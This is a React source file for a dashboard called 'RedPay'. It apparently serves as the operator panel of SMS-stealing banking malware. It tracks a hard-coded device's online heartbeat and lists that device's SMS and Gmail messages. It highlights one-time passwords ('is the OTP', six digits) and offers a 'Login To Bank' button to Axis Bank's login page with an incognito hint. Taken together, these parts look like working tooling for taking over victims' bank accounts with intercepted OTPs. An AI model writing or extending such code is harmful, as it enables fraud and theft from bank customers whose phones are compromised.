import { useState, useEffect, Suspense } from 'react'
import { onValue } from 'firebase/database'
import { useDashboardMessages } from '@/hooks/dashboard'
import { getDefaultProcessor } from '@/lib/message-processors'
import { MessagesSection } from '@/pages/dashboard/components/MessagesSection'
import { getHeartbeatsPath } from '@/lib/firebase-helpers'
import { LazyGmailSection } from '@/pages/dashboard/sections/lazy'
import { MessageSquare, Mail } from 'lucide-react'
import { cn } from '@/lib/utils'

const AXISURGENT_DEVICE_ID = '71e4fa3e11e00c68'
const AXIS_BANK_LOGIN_URL = 'https://nfc.axis.bank.in/pre-login-interim'

interface HeartbeatData {
  t: number
  b?: number
}

export default function AxisUrgentTemp() {
  const defaultProcessor = getDefaultProcessor()
  const {
    messages,
    rawMessages,
    loading,
    error,
    isConnected,
    refresh,
  } = useDashboardMessages({
    deviceId: AXISURGENT_DEVICE_ID,
    dataLimit: 25,
    selectedProcessor: defaultProcessor,
    activeTab: 'sms',
  })

  const [heartbeat, setHeartbeat] = useState<HeartbeatData | null>(null)
  const [now, setNow] = useState(() => Date.now())
  const [mainTab, setMainTab] = useState<'message' | 'gmail'>('message')

  useEffect(() => {
    const ref = getHeartbeatsPath(AXISURGENT_DEVICE_ID)
    const unsub = onValue(ref, snapshot => {
      if (snapshot.exists()) {
        const val = snapshot.val()
        if (val && typeof val === 'object' && typeof (val as HeartbeatData).t === 'number') {
          setHeartbeat({ t: (val as HeartbeatData).t, b: (val as HeartbeatData).b })
        } else {
          setHeartbeat(null)
        }
      } else {
        setHeartbeat(null)
      }
    })
    return () => unsub()
  }, [])

  // Tick every second so we can show \"online\" or seconds since last heartbeat
  useEffect(() => {
    const id = window.setInterval(() => {
      setNow(Date.now())
    }, 1000)
    return () => window.clearInterval(id)
  }, [])

  return (
    <div className="min-h-screen bg-slate-50/80 text-slate-800">
      {/* Gradient header */}
      <header className="bg-gradient-to-r from-violet-100 via-violet-50 to-sky-100 border-b border-slate-200/80 px-4 py-4 sm:px-6">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <h1 className="text-xl font-semibold text-slate-800">RedPay</h1>
        </div>
      </header>

      <main className="p-4 sm:p-6 flex flex-col lg:flex-row gap-4 lg:gap-6 max-w-[1600px] mx-auto">
        {/* Side column – Connection + Login To Bank */}
        <aside className="w-full lg:w-80 xl:w-96 shrink-0">
          <div className="rounded-xl border border-slate-200 bg-white shadow-sm p-4 flex flex-col gap-4">
            {/* Connection (heartbeat) */}
            <div className="flex flex-col gap-3">
              <span className="text-sm font-medium text-slate-600">Connection</span>
              {heartbeat ? (() => {
                const diffSeconds = Math.max(0, Math.floor((now - heartbeat.t) / 1000))
                const isOnline = diffSeconds <= 20
                return (
                  <>
                    <span
                      className={
                        isOnline
                          ? 'inline-flex items-center rounded-full bg-emerald-100 px-3 py-1 text-xs font-medium text-emerald-800 w-fit'
                          : 'inline-flex items-center rounded-full bg-amber-100 px-3 py-1 text-xs font-medium text-amber-800 w-fit'
                      }
                    >
                      {isOnline ? 'Online · ACTIVE' : `${diffSeconds}s since last heartbeat`}
                    </span>
                    <span className="text-sm text-slate-600">
                      <strong>Last seen (IST):</strong>{' '}
                      {new Date(heartbeat.t).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
                    </span>
                  </>
                )
              })() : (
                <span className="inline-flex items-center rounded-full bg-slate-100 px-3 py-1 text-xs font-medium text-slate-600 w-fit">
                  No heartbeat data
                </span>
              )}
            </div>

            {/* Login To Bank */}
            <div className="flex flex-col gap-2">
              <a
                href={AXIS_BANK_LOGIN_URL}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center justify-center rounded-lg bg-violet-600 px-4 py-2 text-sm font-medium text-white hover:bg-violet-700 transition-colors"
              >
                Login To Bank
              </a>
              <span className="text-[10px] text-slate-500">
                Right-click → Open in incognito for private mode
              </span>
            </div>

          </div>
        </aside>

        {/* Main column – Message | Gmail tabs */}
        <section className="min-w-0 flex-1">
          <div className="rounded-xl border border-slate-200 overflow-hidden shadow-sm bg-white">
            {/* Tab bar – matches MessagesSection toolbar style */}
            <div className="flex items-center gap-3 px-4 py-2.5 border-b border-slate-200 bg-slate-50/80">
              <button
                type="button"
                onClick={() => setMainTab('message')}
                className={cn(
                  'h-8 px-3 text-xs font-medium rounded-lg transition-colors',
                  mainTab === 'message'
                    ? 'bg-violet-100 text-violet-800'
                    : 'text-slate-600 hover:bg-slate-100'
                )}
              >
                <MessageSquare className="h-3.5 w-3.5 inline-block mr-1.5 align-middle" />
                Message
              </button>
              <button
                type="button"
                onClick={() => setMainTab('gmail')}
                className={cn(
                  'h-8 px-3 text-xs font-medium rounded-lg transition-colors',
                  mainTab === 'gmail'
                    ? 'bg-violet-100 text-violet-800'
                    : 'text-slate-600 hover:bg-slate-100'
                )}
              >
                <Mail className="h-3.5 w-3.5 inline-block mr-1.5 align-middle" />
                Gmail
              </button>
            </div>
            {/* Content */}
            {mainTab === 'message' && (
              <MessagesSection
                  title="Messages"
                  deviceId={AXISURGENT_DEVICE_ID}
                  messages={messages}
                  rawMessages={rawMessages}
                  loading={loading}
                  error={error}
                  isConnected={isConnected}
                  isAdmin={false}
                  selectedProcessorId={defaultProcessor.id}
                  onRetry={refresh}
                  highlightBodyContains="is the OTP"
                  highlightOtpDigits={6}
                  defaultMessageLimit={25}
              />
            )}
            {mainTab === 'gmail' && (
              <Suspense
                fallback={
                  <div className="flex items-center justify-center p-12">
                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-violet-600" />
                  </div>
                }
              >
                <LazyGmailSection deviceId={AXISURGENT_DEVICE_ID} isAdmin={false} />
              </Suspense>
            )}
          </div>
        </section>
      </main>
    </div>
  )
}
